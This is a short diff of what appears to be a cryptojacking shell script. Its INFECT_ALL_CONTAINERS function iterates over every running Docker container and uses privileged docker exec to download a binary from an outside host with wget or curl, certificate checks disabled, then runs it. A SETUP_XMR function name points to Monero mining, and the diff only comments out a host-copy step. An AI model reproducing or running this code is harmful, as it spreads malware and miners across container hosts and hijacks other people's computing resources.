@@ -109,8 +109,8 @@ function SETUP_XMR() {
 # Infect all containers
 function INFECT_ALL_CONTAINERS() {
     UPSPINTEST=http://x86.anondns.net/sbin
-    mkdir -p /host/bin
-    cp ./sbin /host/bin/sbin || { echo "Failed to copy sbin"; exit 1; }
+   # mkdir -p /host/bin
+   # cp ./sbin /host/bin/sbin || { echo "Failed to copy sbin"; exit 1; }
     docker ps --quiet | while read -r container_id; do
         docker exec --privileged -d "$container_id" sh -c "apk update; apk add wget curl; mkdir -p /var/tmp/; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin" || { echo "Failed to infect container $container_id"; exit 1; }
     done
